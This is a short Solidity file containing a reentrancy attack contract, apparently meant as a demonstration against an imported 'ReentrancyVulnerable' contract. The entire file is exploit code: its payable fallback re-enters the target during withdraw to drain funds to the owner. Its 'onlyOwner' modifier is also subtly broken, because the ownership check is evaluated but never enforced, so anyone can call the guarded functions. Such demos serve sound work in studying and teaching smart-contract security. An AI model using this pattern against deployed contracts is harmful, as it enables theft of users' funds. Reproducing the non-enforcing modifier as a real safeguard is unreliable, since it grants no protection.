pragma solidity >0.4.99 <0.6.0;

import "./ReentrancyVulnerable.sol";

contract ReentrancyAttacker {
  address payable private owner;
  ReentrancyVulnerable private vulnerable;

  constructor(address _vulnerableAddr) public {
    owner = msg.sender;
    vulnerable = ReentrancyVulnerable(_vulnerableAddr);
  }

  modifier onlyOwner {
    msg.sender == owner;
    _;
  }

  function () payable external {
    vulnerable.transfer(owner, msg.value);
  }

  function deposit() payable public onlyOwner {
    vulnerable.deposit.value(msg.value)();
  }

  function withdraw() public onlyOwner {
    vulnerable.withdraw();
    owner.transfer(address(this).balance);
  }
}
